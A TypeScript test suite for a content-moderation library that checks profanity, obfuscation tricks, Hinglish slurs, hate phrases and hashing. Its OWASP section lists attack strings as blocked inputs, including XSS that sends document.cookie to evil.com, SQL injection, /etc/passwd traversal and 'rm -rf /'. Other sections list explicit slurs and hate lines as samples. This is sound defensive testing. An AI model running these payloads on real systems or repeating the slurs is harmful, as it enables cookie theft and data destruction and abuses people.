/**
 * =====================================================================
 * Comprehensive Moderation Test Suite
 * =====================================================================
 * Verifies Layer 1 (Veil Local Engine), Layer 2 (Hive Policy),
 * Cryptographic Caching, Scunthorpe Prevention, and Obfuscation Resistance.
 */

import {
  checkLocalProfanity,
  checkObjectFieldsLocally,
  computePhoneticKey,
  damerauLevenshteinDistance,
  isFuzzyProhibited,
} from '../veil-local';
import { evaluateHiveTextResponse } from '../policy';
import { computeContentHash } from '../cache';
import { chunkText } from '../hive-client';

let passed = 0;
let failed = 0;

function assert(condition: boolean, testName: string, extra?: string) {
  if (condition) {
    console.log(`  ✅ PASS: ${testName}`);
    passed++;
  } else {
    console.error(`  ❌ FAIL: ${testName} ${extra ? `(${extra})` : ''}`);
    failed++;
  }
}

console.log('\n==================================================');
console.log('🧪 RUNNING COMPREHENSIVE CONTENT MODERATION TESTS');
console.log('==================================================\n');

// ----------------------------------------------------
// 1. Scunthorpe Problem Prevention (Legitimate Words)
// ----------------------------------------------------
console.log('--- 1. Testing Scunthorpe Problem & Safe Terms ---');
const legitimateTexts = [
  'Senior Data Analyst and Business Intelligence Consultant',
  'Software Engineer specializing in API documentation and testing',
  'Assisted the principal architect in designing microservices',
  'Created a classic UI library with full accessibility support',
  'Worked as a teaching assistant in algorithms classroom',
  'Led executive leadership and project execution workshops',
  'Created cocktail recipes app using React and Tailwind',
  'Implemented secure password management and authentication',
  'Graduate from Penistone Grammar School with distinction',
  'Studied at Scunthorpe Technology Academy',
  'Arsenal fan and open-source contributor',
  'Developed compass navigation tool for mobile devices',
  'Assembled high-throughput event queues with Apache Kafka',
  'I own land',
  'Designing landing page for real estate client',
];

for (const text of legitimateTexts) {
  const res = checkLocalProfanity(text);
  assert(res.isSafe, `Legitimate Text: "${text.slice(0, 45)}..." should PASS`);
}

// ----------------------------------------------------
// 2. Direct English Profanity & Slurs
// ----------------------------------------------------
console.log('\n--- 2. Testing Direct English Profanities & Slurs ---');
const blatantProfanities = [
  'I am a fucker who hates code',
  'This is some bullshit architecture',
  'You are an absolute asshole',
  'Get the fuck out of here',
  'Total bitch move by the company',
  'Stupid cunt',
  'Go kill yourself right now',
  'sexy fun',
  'sexy-fun',
  'fuc',
  'fuk',
  'fck',
  'fux',
  'moan',
  'moaning',
];

for (const text of blatantProfanities) {
  const res = checkLocalProfanity(text);
  assert(!res.isSafe, `Blatant Profanity: "${text.slice(0, 40)}..." should be BLOCKED`);
}

// ----------------------------------------------------
// 3. Obfuscated Profanity, Leetspeak, Spacing, Repetition
// ----------------------------------------------------
console.log('\n--- 3. Testing Obfuscation, Leetspeak & Punctuation Tricks ---');
const obfuscatedProfanities = [
  'f.u.c.k this system',
  'f u c k you',
  'fuuuuuuuck off',
  'what a b!tch',
  'eat sh1t',
  'you absolute a$$hole',
  'watch this p0rn video',
  'b-i-t-c-h please',
  'f_u_c_k_e_r',
];

for (const text of obfuscatedProfanities) {
  const res = checkLocalProfanity(text);
  assert(!res.isSafe, `Obfuscated Profanity: "${text}" should be BLOCKED`);
}

// ----------------------------------------------------
// 4. Homoglyphs & Zero-Width Characters
// ----------------------------------------------------
console.log('\n--- 4. Testing Homoglyph & Zero-Width Evasions ---');
const zeroWidthFuck = 'f\u200Bu\u200Bc\u200Bk'; // zero-width space in fuck
const cyrillicFuck = 'f\u0443ck'; // Cyrillic 'у' (u)
const cyrillicShit = 'sh\u0456t'; // Cyrillic 'і' (i)

assert(!checkLocalProfanity(zeroWidthFuck).isSafe, 'Zero-width space injection (f\\u200Bu\\u200Bc\\u200Bk) should be BLOCKED');
assert(!checkLocalProfanity(cyrillicFuck).isSafe, 'Cyrillic homoglyph injection (f\\u0443ck) should be BLOCKED');
assert(!checkLocalProfanity(cyrillicShit).isSafe, 'Cyrillic homoglyph injection (sh\\u0456t) should be BLOCKED');

// ----------------------------------------------------
// 5. Hindi & Hinglish Profanities
// ----------------------------------------------------
console.log('\n--- 5. Testing Hindi & Hinglish Profanities ---');
const hinglishProfanities = [
  'tere bhenchod dost',
  'kya madarchod hai ye',
  'chutiya developer',
  'bhosdike apna kaam kar',
  'bhosadiwale chacha',
  'gandu insaan',
  'ye sab randi rona band karo',
  'tu sala harami hai',
  'b.h.e.n.c.h.o.d',
  'chuuuutttiiyaaa',
  'मादरचोद कोड',
  'चूतिया सिस्टम',
  'Muh mein land lele',
  'lund',
  'land lele',
  'muh me lund lele',
  'gand mara',
  'Booze Alchohol',
  'Boosom',
  'bosom',
  'weed & cannabis',
  'casino gambling & betting',
  'onlyfans & sugar daddy',
  'tumhari maiyaa ko thali ki tarah baja denge',
  'baja denge',
  'marijuanna smoke',
  'alchoholic drink',
];

for (const text of hinglishProfanities) {
  const res = checkLocalProfanity(text);
  assert(!res.isSafe, `Prohibited/Abusive Content: "${text}" should be BLOCKED`);
}

// ----------------------------------------------------
// 5C. Continuous Unspaced Stream Verification
// ----------------------------------------------------
console.log('\n--- 5C. Testing Continuous Unspaced Stream Scanning ---');

const continuousUnspacedTexts = [
  'thisisfuckdeveloper',
  'superfuckyou',
  'ilovefuck',
  'superbitchcode',
  'hellomadarchod',
  'thisisbullshit',
  'welcometomypussysite',
  'tumharimaiyakothalikitarahbajadenge',
  'tumharimaiyako',
  'bajadenge',
  'chutiyasaala',
  'ganduinsaan',
  'teriimaakichut',
  'fuckyoubitch',
  'developerfuckingcode'
];

for (const text of continuousUnspacedTexts) {
  const res = checkLocalProfanity(text);
  assert(!res.isSafe, `Continuous Stream: "${text}" should be BLOCKED`);
}

// ----------------------------------------------------
// 5B. Phonetic & Fuzzy Algorithm Verification
// ----------------------------------------------------
console.log('\n--- 5B. Testing Phonetic Signature & Fuzzy Matcher Engines ---');

assert(computePhoneticKey('phuck') === computePhoneticKey('fuck'), 'Phonetic: "phuck" matches "fuck" signature');
assert(computePhoneticKey('fuk') === computePhoneticKey('fuc'), 'Phonetic: "fuk" matches "fuc" signature');
assert(damerauLevenshteinDistance('alcohol', 'alchohol') === 1, 'Fuzzy: "alchohol" is edit-distance 1 from "alcohol"');
assert(damerauLevenshteinDistance('bosom', 'boosom') === 1, 'Fuzzy: "boosom" is edit-distance 1 from "bosom"');
assert(isFuzzyProhibited('alchohol'), 'Fuzzy Engine: "alchohol" correctly recognized as prohibited');
assert(isFuzzyProhibited('boosom'), 'Fuzzy Engine: "boosom" correctly recognized as prohibited');

// ----------------------------------------------------
// 6. Object / Field-Level Checking
// ----------------------------------------------------
console.log('\n--- 6. Testing Structured Object & Field Moderation ---');
const cleanProfile = {
  headline: 'Full-Stack Developer & AI Enthusiast',
  bio: 'Building open-source tools with Next.js, Node.js, and PostgreSQL.',
  location: 'Patiala, Punjab, India',
};
assert(checkObjectFieldsLocally(cleanProfile).isSafe, 'Clean profile object should PASS');

const dirtyProfile = {
  headline: 'Full-Stack Developer',
  bio: 'I hate everything, you are all bhenchods.',
  location: 'Patiala, Punjab, India',
};
const dirtyRes = checkObjectFieldsLocally(dirtyProfile);
assert(!dirtyRes.isSafe && dirtyRes.flaggedField === 'bio', 'Dirty bio field should be BLOCKED and identified');

// ----------------------------------------------------
// 7. Deterministic Content Hashing & Invalidation
// ----------------------------------------------------
console.log('\n--- 7. Testing Cryptographic Content Hashing ---');
const textA = 'John Doe | Full Stack Engineer';
const textB = 'John Doe | Full Stack Engineer';
const textC = 'John Doe | Backend Engineer';

const hashA = computeContentHash(textA);
const hashB = computeContentHash(textB);
const hashC = computeContentHash(textC);

assert(hashA === hashB, 'Identical content produces identical SHA-256 hash');
assert(hashA !== hashC, 'Different content produces distinct SHA-256 hash');
assert(hashA.length === 64, 'SHA-256 hash has length 64');

// ----------------------------------------------------
// 8. Hive Policy Evaluation
// ----------------------------------------------------
console.log('\n--- 8. Testing Hive Policy Engine ---');
const hiveCleanResponse = {
  status: [
    {
      response: {
        output: [
          {
            classes: [
              { class: 'hate', score: 0 },
              { class: 'sexual', score: 0 },
              { class: 'violence', score: 0 },
              { class: 'bullying', score: 0 },
              { class: 'spam', score: 0 },
            ],
          },
        ],
      },
    },
  ],
};
assert(evaluateHiveTextResponse(hiveCleanResponse).allowed, 'Hive response with score 0 should be ALLOWED');

const hiveHateResponse = {
  status: [
    {
      response: {
        output: [
          {
            classes: [
              { class: 'hate', score: 3 },
              { class: 'sexual', score: 0 },
            ],
          },
        ],
      },
    },
  ],
};
assert(!evaluateHiveTextResponse(hiveHateResponse).allowed, 'Hive response with hate:3 should be BLOCKED');

const hivePatternFilterResponse = {
  status: [
    {
      response: {
        text_filters: [{ value: 'BADWORD', type: 'profanity' }],
      },
    },
  ],
};
assert(!evaluateHiveTextResponse(hivePatternFilterResponse).allowed, 'Hive text_filters pattern match should be BLOCKED');

// ----------------------------------------------------
// 9. Smart Text Chunking (Hive Limit Compliance)
// ----------------------------------------------------
console.log('\n--- 9. Testing Smart Text Chunking (<1000 Chars) ---');
const longText = 'Paragraph one about my career and open source. '.repeat(40);
const chunks = chunkText(longText, 500);
assert(chunks.length > 1, `Long text split into ${chunks.length} chunks`);
assert(chunks.every((c) => c.length <= 500), 'All chunks strictly conform to length bound');

// ----------------------------------------------------
// 10. OWASP Top 10 Security & Injection Attack Defense
// ----------------------------------------------------
console.log('\n--- 10. Testing OWASP Top 10 Security & Injection Defense ---');
const owaspAttacks = [
  { payload: '<script>alert("XSS")</script>', name: 'XSS Script Tag' },
  { payload: '<img src=x onerror=alert(1)>', name: 'XSS Image OnError' },
  { payload: '<svg/onload=alert(document.cookie)>', name: 'XSS SVG OnLoad' },
  { payload: 'javascript:fetch("http://evil.com/"+document.cookie)', name: 'XSS Javascript Protocol' },
  { payload: 'admin" OR "1"="1', name: 'SQL Injection String Bypass' },
  { payload: "1' OR '1'='1", name: 'SQL Injection Quote Bypass' },
  { payload: '1; UNION SELECT username, password FROM users--', name: 'SQL Injection Union Select' },
  { payload: '1; DROP TABLE users;', name: 'SQL Injection Drop Table' },
  { payload: '1; WAITFOR DELAY "0:0:5"', name: 'SQL Injection Time Delay' },
  { payload: '../../../../etc/passwd', name: 'Path Traversal /etc/passwd' },
  { payload: '..\\..\\windows\\system32\\cmd.exe', name: 'Path Traversal Windows System32' },
  { payload: 'rm -rf /', name: 'OS Command Injection rm -rf' },
  { payload: 'powershell -enc aW52b2tlLWV4cHJlc3Npb24=', name: 'OS Command Injection PowerShell' },
  { payload: '__proto__.isAdmin = true', name: 'Prototype Pollution Vector' },
];

for (const attack of owaspAttacks) {
  const res = checkLocalProfanity(attack.payload);
  assert(!res.isSafe, `OWASP Attack Blocked: "${attack.name}"`, res.reason);
}

// Ensure legitimate developer text with technical keywords passes
const legitimateTechnicalText = [
  'Expert in SQL database design, indexing, and PostgreSQL optimization',
  'Wrote automation scripts using JavaScript and Python',
  'Built secure web applications following OWASP security standards',
  'Created user-friendly interfaces with React, Next.js, and Tailwind CSS',
];

for (const tech of legitimateTechnicalText) {
  const res = checkLocalProfanity(tech);
  assert(res.isSafe, `Legitimate Technical Text Passes: "${tech.slice(0, 35)}..."`);
}

// ----------------------------------------------------
// 11. Hive V3 Extended Policy Rules
// ----------------------------------------------------
console.log('\n--- 11. Testing Hive V3 Extended Policy Classes ---');
const hiveV3SexualSolicitation = {
  output: [
    {
      classes: [
        { class: 'sexual', value: 2 },
        { class: 'bullying', value: 0 },
        { class: 'hate', value: 0 },
      ],
    },
  ],
};
assert(!evaluateHiveTextResponse(hiveV3SexualSolicitation).allowed, 'Hive V3 sexual solicitation (value: 2) should be BLOCKED');

const hiveV3BullyingDefamation = {
  output: [
    {
      classes: [
        { class: 'bullying', value: 2 },
        { class: 'violence', value: 0 },
      ],
    },
  ],
};
assert(!evaluateHiveTextResponse(hiveV3BullyingDefamation).allowed, 'Hive V3 bullying / defamation (value: 2) should be BLOCKED');

const hiveV3ChildSafety = {
  output: [
    {
      classes: [
        { class: 'child_safety', value: 1 },
      ],
    },
  ],
};
assert(!evaluateHiveTextResponse(hiveV3ChildSafety).allowed, 'Hive V3 child safety (value: 1) should be BLOCKED (zero tolerance)');

// ----------------------------------------------------
// 12. Institutional, Tech, Foundation & Universal Hate Speech Protection
// ----------------------------------------------------
console.log('\n--- 12. Testing Institutional, Tech, Foundation & Universal Hate Speech Protection ---');
const defamatoryAndHatePhrases = [
  'Thapar is a bad college',
  'thapar is the worst university',
  'TIET is garbage',
  'Thapar is a scam',
  'OWASP is bad',
  'owasp is the worst organization',
  'OWASP is a scam',
  'owasp sucks',
  'Linux is garbage',
  'google is scam',
  'This is a bad college',
  'worst university in india',
  'college is useless and garbage',
  'tier 3 college student',
  'thapar bakwas hai',
  'scam college',
  'thapar chor hai',
  'tiet ghatiya institute',
  'professors are corrupt and useless',
  'this company is corrupt and fraud',
  'I hate all Muslims',
  'all women are trash',
  'death to all immigrants',
  'John is a fraudster and thief',
  'Sam should die and suffer',
  'Alex is a creep and pervert',
  'Rohan is a liar and cheater',
  'Sarah should be fired and jailed',
  'This guy is a stalker and abuser',
  'Priya is a fraud and scammer',
  'Ankit chutiya hai',
  'Rahul chor hai',
  'He is a pathetic loser and idiot',
  'I hate John',
  'David is disgusting and ugly',
  'Professional Hater',
  'Proffesional Hater',
  'Hater',
  'haters',
  'Certified Hater',
  'Full-time Troll',
  'Serial Scammer',
  'Professional harasser',
];

for (const phrase of defamatoryAndHatePhrases) {
  const res = checkLocalProfanity(phrase);
  assert(!res.isSafe, `Defamation/Hate phrase blocked: "${phrase}"`);
}

const safeInstitutionalAndTechPhrases = [
  'Undergraduate student at Thapar Institute of Engineering and Technology',
  'Studying Computer Science at Thapar University',
  'B.E. Computer Engineering from Thapar',
  'Software Engineer intern at Razorpay, student at TIET Patiala',
  'Led technical college projects and hackathons',
  'Graduated with honors from my university degree',
  'Built secure applications following OWASP Top 10 guidelines',
  'Contributed to Linux kernel and open source projects',
  'Experienced with Google Cloud Platform, Microsoft Azure, and AWS',
  'Member of IEEE and ACM student chapters',
  'Passionate software engineer building full stack web apps',
  'Collaborated with university professors and student teams',
  'Led software engineering team at a fast-growing startup',
  'Wrote article about OWASP web security best practices',
  'Worked under the mentorship of Dr. Sharma',
  'Collaborated with Rahul and Sarah on the backend architecture',
  'Inspired by Alan Turing and Linus Torvalds',
  'Managed a team of 5 software engineers',
  'Co-authored research paper with Alex and John',
  'Recommended by John for frontend development excellence',
];

for (const safePhrase of safeInstitutionalAndTechPhrases) {
  const res = checkLocalProfanity(safePhrase);
  assert(res.isSafe, `Safe institutional/tech phrase allowed: "${safePhrase.slice(0, 35)}..."`);
}

// ----------------------------------------------------
// 13. Academic Degrees, Credentials & Roles Whitelist
// ----------------------------------------------------
console.log('\n--- 13. Testing Academic Degrees, Credentials & Roles Whitelist ---');
const degreeExamples = [
  'B.Tech', 'b.tech', 'B.Tech.', 'B Tech', 'BTech', 'B.Tech in Computer Science',
  'M.Tech', 'm.tech', 'MTech',
  'B.E.', 'B.E', 'B.Sc', 'M.Sc', 'Ph.D', 'Ph.D.', 'MCA', 'BCA', 'MBA', 'BBA',
  'B.Des', 'B.Arch', 'B.Com', 'M.Com', 'MBBS'
];

for (const degree of degreeExamples) {
  const res = checkLocalProfanity(degree);
  assert(res.isSafe, `Degree allowed without false positive: "${degree}"`);
}

// ----------------------------------------------------
// SUMMARY
// ----------------------------------------------------
console.log('\n==================================================');
console.log(`🏁 TEST RESULTS: ${passed} PASSED | ${failed} FAILED`);
console.log('==================================================\n');

if (failed > 0) {
  process.exit(1);
} else {
  process.exit(0);
}
